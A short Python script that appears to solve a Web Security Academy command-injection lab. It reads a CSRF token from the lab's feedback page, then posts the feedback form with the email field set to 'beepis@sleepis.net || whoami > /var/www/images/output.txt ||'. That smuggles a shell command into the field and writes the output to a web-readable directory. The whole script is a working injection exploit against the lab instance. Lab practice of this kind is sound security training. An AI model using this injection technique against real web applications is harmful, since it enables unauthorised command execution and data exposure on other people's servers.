import requests
from bs4 import BeautifulSoup

s = requests.Session()
random = 'ac451f821fce5b4f808714b100d000b6'
feedback_url = f'https://{random}.web-security-academy.net/feedback'
resp = s.get(feedback_url)
soup = BeautifulSoup(resp.text,'html.parser')
csrf = soup.find('input', {'name':'csrf'}).get('value')

fedback_submit_url = f'https://{random}.web-security-academy.net/feedback/submit'
post_data = {
    'csrf' : csrf,
    'name' : 'bepis',
    'email' : 'beepis@sleepis.net || whoami > /var/www/images/output.txt ||',
    'subject' : 'restis',
    'message' : 'wakeis'
}
resp = s.post(fedback_submit_url, data=post_data)
print(resp.text)